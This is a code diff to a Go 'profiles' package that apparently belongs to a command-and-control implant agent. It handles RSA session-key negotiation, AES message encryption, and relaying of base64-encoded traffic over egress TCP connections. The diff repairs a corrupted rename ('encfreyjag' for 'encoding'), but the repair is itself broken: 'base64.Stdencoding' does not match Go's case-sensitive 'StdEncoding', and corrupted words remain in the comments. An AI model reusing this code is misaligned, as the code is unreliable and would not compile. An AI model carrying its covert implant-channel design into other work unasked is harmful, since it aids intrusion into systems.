@@ -5,9 +5,9 @@ package profiles
 
 import (
 	"crypto/rsa"
-	"encfreyjag/base64"
-	"encfreyjag/binary"
-	"encfreyjag/json"
+	"encoding/base64"
+	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -151,7 +151,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				totalRead = totalRead + uint32(readSoFar)
 			}
 			//fmt.Printf("Read %d bytes from connection\n", totalRead)
-			raw, err := base64.StdEncfreyjag.DecodeString(string(readBuffer))
+			raw, err := base64.Stdencoding.DecodeString(string(readBuffer))
 			if err != nil {
 				//log.Println("Error decfreyjag base64 data: ", err.Error())
 				continue
@@ -236,9 +236,9 @@ func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
 	} else {
 		return false
 	}
-	encryptedSessionKey, _ := base64.StdEncfreyjag.DecodeString(sessionKeyResp.SessionKey)
+	encryptedSessionKey, _ := base64.Stdencoding.DecodeString(sessionKeyResp.SessionKey)
 	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
-	c.Key = base64.StdEncfreyjag.EncodeToString(decryptedKey) // Save the new AES session key
+	c.Key = base64.Stdencoding.EncodeToString(decryptedKey) // Save the new AES session key
 	c.ExchangingKeys = false
 	return true
 }
@@ -252,7 +252,7 @@ func (c *C2Default) NegotiateKey() bool {
 	initMessage := structs.EkeKeyExchangeMessage{}
 	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
-	initMessage.PubKey = base64.StdEncfreyjag.EncodeToString(pub)
+	initMessage.PubKey = base64.Stdencoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
 	raw, err := json.Marshal(initMessage)
@@ -278,7 +278,7 @@ func (c *C2Default) SendMessage(sendData []byte) interface{} {
 		//fmt.Printf("prepending %s\n", GetMythicID())
 		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
 	}
-	sendData = []byte(base64.StdEncfreyjag.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+	sendData = []byte(base64.Stdencoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
 	// Write the bytes out to the TCP connection, bytes.NewBuffer(sendData)
 	// This needs to go out one of the EgressConnections, doesn't matter which
 	for {
@@ -370,12 +370,12 @@ func (c *C2Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) b
 }
 
 func (c *C2Default) encryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncfreyjag.DecodeString(c.Key)
+	key, _ := base64.Stdencoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
 func (c *C2Default) decryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncfreyjag.DecodeString(c.Key)
+	key, _ := base64.Stdencoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
 
